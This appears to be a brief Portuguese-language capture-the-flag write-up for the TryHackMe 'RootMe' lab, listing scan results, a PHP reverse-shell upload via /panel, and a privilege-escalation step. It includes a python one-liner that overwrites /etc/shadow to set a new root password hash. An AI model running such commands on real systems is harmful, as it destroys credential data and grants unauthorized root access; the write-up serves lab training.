#ctf
# RootMe
https://tryhackme.com/room/rrootme

## NMAP
- Porta 22/tcp aberta: SSH
  - Versão: OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocolo 2.0)
- Porta 80/tcp aberta: HTTP
  - Servidor: Apache httpd 2.4.29 ((Ubuntu))

## GOBUSTER
- `/panel` -> Permite fazer upload de um arquivo PHP5 com shell reverso.
- `/uploads`

## PRIVESC
- `/usr/bin/python` pode ser utilizado para escalonamento de privilégios.

- É possivel usar o python para escrever uma nova senha para o root. 

  ```bash
  python -c 'open("/etc/shadow","w+").write("root:$6$KHvevc8xinNX0YYC$h2jFKDnWzGG0Na.63DHOtX6dHkg18f5a0AwovLqIYKUI6.2B4UKE9WSRvvzMaj.zuNjecnmkbGlptgK7sBY6.0:18478:0:99999:7:::")'
  ```
  
GG
